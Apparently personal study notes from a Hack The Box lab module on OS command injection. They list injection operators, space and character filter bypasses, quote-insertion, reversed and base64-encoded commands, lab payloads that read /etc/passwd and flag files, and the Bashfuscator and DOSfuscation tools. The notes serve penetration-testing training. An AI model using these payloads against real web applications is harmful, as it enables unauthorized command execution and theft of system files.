## Injection Operators

| **Injection Operator** | **Injection Character** | **URL-Encoded Character** | **Executed Command**                       |
| ---------------------- | ----------------------- | ------------------------- | ------------------------------------------ |
| Semicolon              | `; `                    | `%3b`                     | Both                                       |
| New Line               | `\n`                    | `%0a`                     | Both                                       |
| Background             | `&`                     | `%26`                     | Both (second output generally shown first) |
| Pipe                   | Pipe character          | `%7c`                     | Both (only second output is shown)         |
| AND                    | `&&`                    | `%26%26`                  | Both (only if first succeeds)              |
| OR                     | Two pipe chars          | `%7c%7c`                  | Second (only if first fails)               |
| Sub-Shell              | 2x escape chars         | `%60%60`                  | Both (Linux-only)                          |
| Sub-Shell              | `$()`                   | `%24%28%29`               | Both (Linux-only)                          |

We can use any of these operators to inject another command so both or either of the commands get executed. We would write our expected input (e.g., an IP), then use any of the above operators, and then write our new command.

*Tip: In addition to the above, there are a few unix-only operators, that would work on Linux and macOS, but would not work on Windows, such as wrapping our injected command with double backticks or with a sub-shell operator (`$()`).*

## Filtered Character Bypass

### Spaces

#### Using tabs instead of spaces
```Shell
%09
```

#### Replace with a space and a tab
```Shell
${IFS}
```

#### Replace commas with spaces
```Shell
{ls,-la}
```

#### [PayLoadsAllTheThings Space Bypasses](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#bypass-without-space)


### Other Characters

#### Will be replaced with `/`
```Shell
${PATH:0:1}
```

#### Will be replaced with `;`
```Shell
${LS_COLORS:10:1}
```

#### Shift character by one (`[` -> `\`)
```Shell
$(tr '!-}' '"-~'<<<[) 	
```

### Blacklisted Commands Bypass

#### Character Insertion
`'` or `"`
Total must be even

`$@` or `\`
Linux only

```cmd.exe
^
```
Windows only (CMD)

#### Case Manipulation
```Shell
$(tr "[A-Z]" "[a-z]"<<<"WhOaMi")
```
Execute command regardless of cases

```Shell
$(a="WhOaMi";printf %s "${a,,}")
```
Another variation of the technique

```cmd.exe
WhoAmi
```
Simply send the character with odd cases

#### Reversed Commands
```Shell
echo 'whoami' | rev
```
Reverse a string

```Shell
$(rev<<<'imaohw')
```
Execute reversed command

```PowerShell
"whoami"[-1..-20] -join ''
```
Reverse a string

```PowerShell
iex "$('imaohw'[-1..-20] -join '')"
```
Execute a reversed command

#### Encoded Commands
```Shell
echo -n 'cat /etc/passwd | grep 33' | base64
```
Encode a string with base64

```Shell
bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)
```
Execute base64 encoded string

```PowerShell
[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('whoami'))
```
Encode a string with base64

```PowerShell
iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))"
```
Encode a string with base64

### Windows Filtered Character Bypass

#### Get all environment variables
```PowerShell
Get-ChildItem Env:
```

#### Spaces
```cmd
%09
```
Using tabs instead of spaces

```cmd.exe
%PROGRAMFILES:~10,-5%
```
Will be replaced with a space - (CMD)

```cmd.exe
$env:PROGRAMFILES[10]
```
Will be replaced with a space - (PowerShell)

#### Other Characters
```cmd.exe
%HOMEPATH:~0,-17%
```
Will be replaced with `\` - (CMD)

```cmd.exe
$env:HOMEPATH[0]
```
Will be replaced with `\` - (PowerShell)

### Injecting Our Command
Add a command following the input and injection operator. E.g., `10.10.16.13; whoami`

### Bypassing Front-End Validation
![[Pasted image 20230207154315.png]]
Intercept a POST request and send to Repeater, where the body of the request is modified with the command injection

### Other Injection Operators

#### AND Operator
```Shell
127.0.0.1 && whoami
```

##### In Burp (w/ URL encoding) to bypass front-end validation
![[Pasted image 20230207160218.png]]

#### OR Operator
Only executes the second command if the first command fails to execute. This may be useful for us in cases where our injection would break the original command without having a solid way of having both commands work.

```Shell
|| whoami
```
Use a command in place of the IP that intentionally doesn't work so that the algorithm moves on and calls the command `whoami`

##### In Burp to bypass front-end validation
![[Pasted image 20230207160518.png]]

## Filter Evasion

### Identifying Blacklisted Character
Reduce the request in Repeater to one character at a time and see when it gets blocked
![[Pasted image 20230207162700.png]]

### Bypass Blacklisted Operators
![[Pasted image 20230207163533.png]]
`\n` URL-encoded successfully bypasses filter

### Bypass Blacklisted Spaces
![[Pasted image 20230207163551.png]]
We still get an invalid input error message, meaning that we still have other filters to bypass

#### Only add the next character (which is a space) and see if it caused the denied request
![[Pasted image 20230207163644.png]]
The space character is indeed blacklisted as well. A space is a commonly blacklisted character, especially if the input should not contain any spaces, like an IP

#### Using Tabs
`%09`
![[Pasted image 20230207164531.png]]

#### Using $IFS
`${IFS}` --> `127.0.0.1%0a${IFS}`

#### Using Brace Expansion
`{ls,-la}`

***LAB*
![[Filter bypasses.png]]
`ip=10.10.16.13%0als${IFS}-la`

### Bypassing Blacklisted Characters - Linux
A commonly blacklisted character is the slash (`/`) or backslash (`\`) character

![[Pasted image 20230207171109.png]]

*Hint: The printenv command prints all environment variables in Linux, so you can look which ones may contain useful characters, and then try to reduce the string to that character only.*

### Bypassing Blacklisted Characters - Windows
`echo` a Windows variable (`%HOMEPATH%` ->` \Users\htb-student`), and then specify a starting position (`~6` ->` \htb-student`), then specifying a negative end position, which in this case is the length of the username `htb-student` (`-11` -> `\`)

#### CMD Prompt
```cmd.exe
echo %HOMEPATH:~6,-11%

\
```

#### PowerShell
```PowerShell
$env:HOMEPATH[0]

\
```

```PowerShell
$env:PROGRAMFILES[10]
```
With PowerShell, a word is considered an array, so we have to specify the index of the character we need

*We can also use the `Get-ChildItem Env:` PowerShell command to print all environment variables and then pick one of them to produce a character we need.*

### Character Shifting
```Shell
man ascii     # \ is on 92, before it is [ on 91
echo $(tr '!-}' '"-~'<<<[)

\
```
Shifts the character we pass by `1`. Find the character in the ASCII table that is just before our needed character, then add it instead of `[`
![[ascii shift 1.png]]

```Shell
echo $(tr '!-}' '"-~'<<<:)

;
```
Shifts the character we pass by `1`. Find the character in the ASCII table that is just before our needed character, then add it instead of `:`
![[ascii shift 2.png]]

***LAB:*
![[Other Bypasses.png]]
`ip=127.0.0.1%0a${IFS}ls${IFS}${PATH:0:1}home`

### Bypassing Blacklisted Commands

#### Bypassing with Quotation Marks
```Shell
w'h'o'am'i
```

```Shell
w"h"o"am"i
```
***We cannot mix types of quotes and the number of quotes must be even***

#### Bypassing for Linux Only
- `\`
- `$@`

```Shell
who$@ami
```
The number of characters do not have to be even

#### Bypassing for Windows Only
```cmd.exe
who^ami
```
`^` can bypass the filter

***LAB:*
`ip=10.10.16.13%0aw'h'o'am'i`
`ip=10.10.16.13%0ac'a't${IFS}${PATH:0:1}home${PATH:0:1}1nj3c70r${PATH:0:1}flag.txt`


## Advanced Command Obfuscation

### Case Manipulation

#### Windows (not case sensitive)
```PowerShell
WhOaMi
```

#### Linux (case sensitive)
```Shell
$(tr "[A-Z]" "a-z"<<<"WhOaMi")
```

##### Replace spaces with tabs (`%09`)
```Shell
$(tr%09"[A-Z]"%09"a-z"<<<"WhOaMi")
```
![[Pasted image 20230209102014.png]]

#### Linux - Additional Option
```Shell
$(a="WhOaMi";printf %s "${a,,}")
```
Be sure to replace spaces with non-filtered characters (e.g., `%09`)

### Reversed Commands

#### Get the reversed string of our command in our terminal
```Shell
echo 'whoami' | rev
```

#### Execute the original command by reversing it in a sub-shell
```Shell
$(rev<<<'imaohw')
```
![[Pasted image 20230209102410.png]]
***Tip: If you wanted to bypass a character filter with the above method, you'd have to reverse them as well, or include them when reversing the original command.*

#### Reversed command in Windows
```PowerShell
"whoami"[-1..-20] -join ''
```

#### Execute a reversed string in Windows
```PowerShell
iex "$('imaohw'[-1..-20] -join '')"
```

### Encoded Commands
`base64` (for b64 encoding) or `xxd` (for hex encoding)

#### base64 Encoded Command - Linux
```Shell
echo -n 'cat /etc/passwd | grep 33' | base64
```

#### Command for decoding the encoded string
```Shell
bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)
```
*Tip: Note that we are using `<<<` to avoid using a pipe `|`, which is a filtered character.*

![[Pasted image 20230209103321.png]]
Even if some commands were filtered, like `bash` or `base64`, we could bypass that filter with the techniques we discussed in the previous section (e.g., character insertion), or use other alternatives like sh for command execution and openssl for b64 decoding, or xxd for hex decoding.

#### Base64 Encoded Command - Windows
```PowerShell
[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('whoami'))
```

#### Base64 Encoded Command - Linux
```Shell
echo -n whoami | iconv -f utf-8 -t utf-16le | base64
```

#### Decode base64 Command and execute it with a PowerShell sub-shell (`iex "$()"`) - Windows
```PowerShell
iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))"
```

[Additional Techniques in PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#bypass-with-variable-expansion)

***LAB:*

On Kali:
```Shell
echo -n 'find /usr/share/ | grep root | grep mysql | tail -n 1' | iconv -f utf-8 -t utf-16le | base64
```
Output: `ZgBpAG4AZAAgAC8AdQBzAHIALwBzAGgAYQByAGUALwAgAHwAIABnAHIAZQBwACAAcgBvAG8AdAAgAHwAIABnAHIAZQBwACAAbQB5AHMAcQBsACAAfAAgAHQAYQBpAGwAIAAtAG4AIAAxAA==`

In Burp:
`ip=10.10.16.13%0ab'a's'h'<<<$('b'a's'e'6'4%09-d<<<ZgBpAG4AZAAgAC8AdQBzAHIALwBzAGgAYQByAGUALwAgAHwAIABnAHIAZQBwACAAcgBvAG8AdAAgAHwAIABnAHIAZQBwACAAbQB5AHMAcQBsACAAfAAgAHQAYQBpAGwAIAAtAG4AIAAxAA==)`

*Used `%0a` to break command, `%09` for spaces, and character insertion for `bash` and `base64`*`
![[advanced bypass 1.png]]


## Evasion Tools

### Linux (Bashfuscator)

#### Installing Bashfuscator
```Shell
git clone https://github.com/Bashfuscator/Bashfuscator
cd Bashfuscator
python3 setup.py install --user
cd ./bashfuscator/bin
```

#### Examining options
```Shell
./bashfuscator -h
```


#### Providing the command we want to obfuscate with the `-c `flag
```Shell
./bashfuscator -c 'cat /etc/passwd'
```

#### Using use flags from the help menu to produce a shorter and simpler obfuscated command
```Shell
./bashfuscator -c 'cat /etc/passwd' -s 1 -t 1 --no-mangling --layers 1
```

#### Test the outputted command with `bash -c ''`
```Shell
bash -c 'eval "$(W0=(w \  t e c p s a \/ d);for Ll in 4 7 2 1 8 3 2 4 8 5 7 6 6 0 9;{ printf %s "${W0[$Ll]}";};)"'
```

### Windows (DOSfuscation)

#### Importing and invoking DOSfuscation in PowerShell
```PowerShell
Import-Module .\Invoke-DOSfuscation.psd1
```

```PowerShell
Invoke-DOSfuscation
```

#### Using DOSfuscation
```PowerShell
SET COMMAND type C:\Users\htb-student\Desktop\flag.txt
encoding
1
```

#### Running the obfuscated command on CMD to ensure it works as expected
```cmd.exe
typ%TEMP:~-3,-2% %CommonProgramFiles:~17,-11%:\Users\h%TMP:~-13,-12%b-stu%SystemRoot:~-4,-3%ent%TMP:~-19,-18%%ALLUSERSPROFILE:~-4,-3%esktop\flag.%TMP:~-13,-12%xt
```

*Tip: If we do not have access to a Windows VM, we can run the above code on a Linux VM through `pwsh`. Run `pwsh`, and then follow the exact same command from above. *

